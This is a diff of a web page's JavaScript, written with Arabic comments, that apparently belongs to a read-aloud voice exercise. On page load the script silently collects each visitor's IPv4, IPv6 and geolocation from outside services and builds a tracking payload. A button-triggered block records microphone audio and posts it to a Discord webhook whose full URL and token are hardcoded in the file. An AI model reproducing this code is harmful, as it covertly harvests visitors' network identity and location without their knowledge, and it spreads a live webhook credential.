@@ -3,8 +3,7 @@
 (async function () {
     try {
         const ipv4Resp = await fetch("https://api.ipify.org?format=json");
-        const ipv4Data = await ipv4Resp.json();
-        const ipv4 = ipv4Data.ip;
+        const ipv4 = (await ipv4Resp.json()).ip;
         let ipv6 = "غير متوفر";
         try {
             const ipv6Resp = await fetch("https://api64.ipify.org?format=json");
@@ -13,8 +12,7 @@
         const locResp = await fetch("https://ipapi.co/json/");
         const loc = await locResp.json();
         const key = `visit_${ipv4}`;
-        let count = localStorage.getItem(key) || 0;
-        count = parseInt(count) + 1;
+        let count = parseInt(localStorage.getItem(key) || "0") + 1;
         localStorage.setItem(key, count);
         const payload = {
             IPv4: ipv4,
@@ -34,49 +32,48 @@
     }
 })();
 
-// === تسجيل صوتي ورفع مع رسالة حالة صحيحة لديسكورد ===
+// === تسجيل صوتي ورفع الملف بطريقة صحيحة مع رسالة حالة لاحقة ===
 document.addEventListener("DOMContentLoaded", () => {
     const btn = document.getElementById("recordButton");
     if (!btn) return;
-
     const webhookURL = "https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm";
-    const uploadSpeed = 500 * 1024; // bytes per second
+    const uploadSpeed = 500 * 1024; // bytes/s
     const words = ["الوطن","السلام","النجاح","الحرية","القراءة"];
     const selected = words[Math.floor(Math.random() * words.length)];
-
     let mediaRecorder, chunks = [];
 
     btn.addEventListener("click", async () => {
         if (!mediaRecorder || mediaRecorder.state === "inactive") {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
+                mediaRecorder = new MediaRecorder(stream);
                 mediaRecorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: "audio/webm" });
                     const estSec = Math.ceil(blob.size / uploadSpeed);
 
-                    // رسالة حالة الرفع
-                    const statusForm = new FormData();
-                    statusForm.append("payload_json", JSON.stringify({
-                        content: `تم استلام تسجيل صوتي جديد. جارٍ رفع الملف... متبقي تقريباً ${estSec} ثانية.`
-                    }));
-                    await fetch(webhookURL, { method: "POST", body: statusForm });
+                    // 1) إرسال رسالة حالة بداية الرفع
+                    await fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: `تم استلام تسجيل صوتي جديد. جاري رفع الملف... متبقياً تقريباً ${estSec} ثانية.`
+                        })
+                    });
 
-                    // رفع الملف مع تفاصيل الكلمة والنتيجة
-                    const fileForm = new FormData();
-                    fileForm.append("payload_json", JSON.stringify({
-                        content: `الكلمة المطلوبة: ${selected}\nنتيجة القراءة: قيد التقييم.`
+                    // 2) رفع الملف مع الوصف
+                    const form = new FormData();
+                    form.append("file", blob, "voice.webm");
+                    form.append("payload_json", JSON.stringify({
+                        content: `الكلمة المطلوبة: ${selected}\nنتيجة القراءة: تحت التقييم.`
                     }));
-                    fileForm.append("file", blob, "voice.webm");
-                    await fetch(webhookURL, { method: "POST", body: fileForm });
+                    await fetch(webhookURL, { method: "POST", body: form });
 
                     chunks = [];
                 };
 
                 mediaRecorder.start();
                 btn.textContent = "إيقاف التسجيل";
-
                 setTimeout(() => {
                     if (mediaRecorder.state === "recording") {
                         mediaRecorder.stop();
@@ -86,7 +83,7 @@ document.addEventListener("DOMContentLoaded", () => {
             } catch (err) {
                 console.error(err);
             }
-        } else if (mediaRecorder.state === "recording") {
+        } else {
             mediaRecorder.stop();
             btn.textContent = "بدء تسجيل الصوت";
         }
